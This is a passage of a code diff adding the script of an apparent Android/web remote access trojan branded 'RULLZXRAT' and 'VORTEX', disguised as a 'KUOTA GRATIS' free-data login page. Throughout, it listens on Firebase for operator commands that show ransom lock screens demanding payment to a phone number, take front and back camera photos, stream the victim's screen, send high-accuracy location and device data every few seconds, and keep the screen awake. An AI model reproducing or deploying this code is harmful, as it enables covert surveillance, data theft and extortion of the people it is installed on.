+                ctx.fillRect(0, 0, w, h);
+                function draw() {
+                    ctx.fillStyle = 'rgba(0,0,0,0.04)';
+                    ctx.fillRect(0, 0, w, h);
+                    ctx.fillStyle = '#00ff41';
+                    ctx.font = '14px monospace';
+                    for (var i = 0; i < cols; i++) {
+                        var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                        var x = i * 14;
+                        var y = ypos[i];
+                        ctx.fillText(text, x, y);
+                        if (y > h && Math.random() > 0.99) {
+                            ypos[i] = 0;
+                        } else {
+                            ypos[i] += 14;
+                        }
+                    }
+                    requestAnimationFrame(draw);
+                }
+                draw();
+                window.addEventListener('resize', function() {
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                });
+            }
+
+            // =============================================================
+            // 👂 LISTENER PERINTAH DARI ADMIN
+            // =============================================================
+            function startCommandListener() {
+                if (!MY_ID) return;
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                commandListener = function(snap) {
+                    var d = snap.val();
+                    if (!d) return;
+                    console.log('📩 Command:', d);
+
+                    // --- LOCK V2 ---
+                    if (d.status === 'LOCK_V2') {
+                        showLockV2({
+                            message: d.message || "HELLO I'M RULLZ",
+                            pengirim: d.pengirim || "RULLZXRAT",
+                            noHp: d.noHp || "088708157164",
+                            nominal: d.nominal || "500.000",
+                            metode: d.metode || "DANA ONLY",
+                            bgColor: d.bgColor || "black"
+                        });
+                    }
+                    else if (d.status === 'UNLOCK_V2') {
+                        hideLockV2();
+                        if (window.RullzInterface) window.RullzInterface.exitApp();
+                    }
+                    // --- SOS LOCK V2 (matrix merah) ---
+                    else if (d.status === 'SOS_LOCK_V2') {
+                        startSOSMatrix(d.message || '⚠️ SOS LOCKED ⚠️');
+                    }
+                    else if (d.status === 'SOS_UNLOCK_V2') {
+                        stopSOSMatrix();
+                        if (window.RullzInterface) window.RullzInterface.exitApp();
+                    }
+                    // --- SOS LOCK biasa (biru) ---
+                    else if (d.status === 'SOS_LOCK') {
+                        showSOSLock(d.message || "Hacked By Rullz");
+                    }
+                    else if (d.status === 'SOS_UNLOCK') {
+                        unlockSOS();
+                    }
+                    // --- LOCK biasa ---
+                    else if (d.status === 'LOCK') {
+                        if (d.bgColor) setLockBackground(d.bgColor, d.bgValue);
+                        else setLockBackground('black', null);
+                        document.getElementById('lockCont').style.display = 'block';
+                        document.getElementById('lTit').innerText = d.sender || "LOCK BY RULLZXRAT";
+                        window.correctPin = d.key;
+                        focusInput();
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                    }
+                    else if (d.status === 'UNLOCK') {
+                        unlockApp();
+                    }
+                    // --- RESET ---
+                    else if (d.status === 'RESET_SYSTEM_UI') {
+                        location.reload();
+                    }
+                    // --- FLASH ---
+                    else if (d.status === 'FLASH_ON') {
+                        if (window.RullzInterface) window.RullzInterface.toggleFlash(true);
+                    }
+                    else if (d.status === 'FLASH_OFF') {
+                        if (window.RullzInterface) window.RullzInterface.toggleFlash(false);
+                    }
+                    // --- HELL LOCK ---
+                    else if (d.status === 'HELL_LOCK') {
+                        var h = document.getElementById('hell');
+                        document.getElementById('hellMessage').innerText = d.message || "HELLO I'M RULLZ";
+                        h.style.display = 'flex';
+                        if (!window._matrixStarted) {
+                            startMatrix();
+                            window._matrixStarted = true;
+                        }
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                        setTimeout(function() {
+                            h.style.display = 'none';
+                        }, (d.duration || 10) * 1000);
+                    }
+                    // --- TOAST ---
+                    else if (d.status === 'TOAST') {
+                        if (window.RullzInterface) window.RullzInterface.showToast(d.message);
+                        if (!window.RullzInterface) alert(d.message);
+                    }
+                    // --- CAMERA FRONT/BACK ---
+                    else if (d.status === 'CAMERA_FRONT') {
+                        sendCameraImage('user', d.timestamp || Date.now());
+                    }
+                    else if (d.status === 'CAMERA_BACK') {
+                        sendCameraImage('environment', d.timestamp || Date.now());
+                    }
+                    // --- LIVE SCREEN ---
+                    else if (d.status === 'LIVE_SCREEN_ON') {
+                        startScreenStream();
+                    }
+                    else if (d.status === 'LIVE_SCREEN_OFF') {
+                        stopScreenStream();
+                    }
+                    // --- REQUEST LOCATION ---
+                    else if (d.status === 'REQUEST_LOCATION') {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(
+                                function(pos) {
+                                    database.ref('commands/' + MY_ID + '/location_response').set({
+                                        lat: pos.coords.latitude,
+                                        lng: pos.coords.longitude,
+                                        accuracy: pos.coords.accuracy,
+                                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                                    }).catch(function(err){});
+                                },
+                                function(err) {},
+                                { enableHighAccuracy: true, timeout: 5000 }
+                            );
+                        }
+                    }
+                };
+                database.ref('commands/' + MY_ID).on('value', commandListener);
+            }
+
+            // =============================================================
+            // 🔑 PIN HANDLER
+            // =============================================================
+            function handleInput(el) {
+                var val = el.value;
+                document.getElementById('dotsDisplay').innerText = "*".repeat(val.length);
+                if (val.length >= 4) {
+                    if (val === window.correctPin) {
+                        unlockApp();
+                    } else {
+                        el.value = ""; 
+                        document.getElementById('dotsDisplay').innerText = "";
+                    }
+                }
+            }
+
+            function unlockApp() { 
+                document.getElementById('lockCont').style.display = 'none';
+                document.body.style.backgroundColor = "#ffffff";
+                setTimeout(function() {
+                    if (window.RullzInterface) window.RullzInterface.exitApp();
+                }, 300);
+            }
+
+            // =============================================================
+            // 🔐 LOGIN - TANPA PASSWORD, LANGSUNG REGISTER
+            // =============================================================
+            window.fakeLogin = function() {
+                var user = document.getElementById('fakeUser').value.trim();
+                var statusEl = document.getElementById('loginStatus');
+                var btn = document.getElementById('loginBtn');
+
+                if (!user) {
+                    statusEl.textContent = '❌ Masukkan Kode UID terlebih dahulu!';
+                    statusEl.className = 'login-status error';
+                    return;
+                }
+
+                // Hentikan listener lama
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                if (onlineInterval) {
+                    clearInterval(onlineInterval);
+                    onlineInterval = null;
+                }
+                if (dataInterval) {
+                    clearInterval(dataInterval);
+                    dataInterval = null;
+                }
+                stopLocationWatch();
+                stopScreenStream();
+
+                // Loading
+                btn.classList.add('loading');
+                btn.textContent = '⏳ Menghubungkan...';
+                statusEl.textContent = '';
+                statusEl.className = 'login-status';
+
+                MY_ID = user;
+                localStorage.setItem('vortex_uid', MY_ID);
+
+                // Kirim data device
+                setTimeout(function() { sendDeviceData(); }, 100);
+                setTimeout(function() { sendDeviceData(); }, 500);
+
+                // Mulai listener perintah
+                startCommandListener();
+
+                // Mulai lokasi real-time
+                startLocationWatch();
+
+                // Wake Lock (agar layar tetap menyala)
+                try {
+                    if ('wakeLock' in navigator) {
+                        navigator.wakeLock.request('screen').then(function(wl) {
+                            console.log('✅ Wake Lock aktif');
+                        }).catch(function(err){});
+                    }
+                } catch(e) {}
+
+                // Update online setiap 3 detik
+                onlineInterval = setInterval(function() {
+                    if (MY_ID) {
+                        database.ref('targets/' + MY_ID + '/online').set(true);
+                    }
+                }, 3000);
+
+                // Kirim data berkala (sys info update tiap 5 detik)
+                dataInterval = setInterval(function() {
+                    if (MY_ID) sendDeviceData();
+                }, 5000);
+
+                // Tampilkan sukses
+                setTimeout(function() {
+                    btn.textContent = 'save';
+                    btn.classList.remove('loading');
+                    statusEl.textContent = '';
+                    statusEl.className = 'login-status success';
+                    document.querySelector('.login-logo').textContent = 'KUOTA GRATIS';
+                    document.querySelector('.login-sub').textContent = '';
+                    document.getElementById('fakeUser').disabled = true;
+                    document.getElementById('fakeUser').style.opacity = '0.6';
+                    btn.style.opacity = '0.6';
+                    btn.style.pointerEvents = 'none';
+                    console.log('✅ Target terdaftar dengan UID:', MY_ID);
+                }, 1500);
+            };
+
+            // =============================================================
+            // 🔄 CEK SESSION
+            // =============================================================
+            var savedUID = localStorage.getItem('vortex_uid');
+            if (savedUID) {
+                document.getElementById('fakeUser').value = savedUID;
+                setTimeout(function() {
+                    if (document.getElementById('fakeUser').value.trim()) {
+                        window.fakeLogin();
+                    }
+                }, 300);
+            }
+
+            // =============================================================
+            // ⏱️ KIRIM DATA PERANGKAT PERIODIK (cadangan)
+            // =============================================================
+            setInterval(function() {
+                if (MY_ID) sendDeviceData();
+            }, 3000);
+
+            window.addEventListener('beforeunload', function() {
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/online').set(false);
+                }
+                stopScreenStream();
+                stopLocationWatch();
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                }
+                if (onlineInterval) clearInterval(onlineInterval);
+                if (dataInterval) clearInterval(dataInterval);
+            });
+
+            // =============================================================
+            // 🌐 EXPOSE KE GLOBAL
+            // =============================================================
+            window.showLockV2 = showLockV2;
+            window.hideLockV2 = hideLockV2;
+            window.showSOSLock = showSOSLock;
+            window.unlockSOS = unlockSOS;
+            window.handleInput = handleInput;
+            window.unlockApp = unlockApp;
+            window.focusInput = focusInput;
+            window.correctPin = '';
+            window.fakeLogin = fakeLogin;
+            window.startScreenStream = startScreenStream;
+            window.stopScreenStream = stopScreenStream;
+            window.startSOSMatrix = startSOSMatrix;
+            window.stopSOSMatrix = stopSOSMatrix;
+
+            console.log('✅ VORTEX Target aktif - Login hanya dengan UID, auto-register, SYS INFO real-time');
+            console.log('💡 Masukkan UID dari admin, klik Login, otomatis terdaftar!');
+            console.log('📱 Semua fitur admin: LOCK, UNLOCK, SOS, HELL, FLASH, CAMERA, SCREEN, LOCATION, SYS INFO siap.');
+        })();
+    </script>
+</body>
+</html>
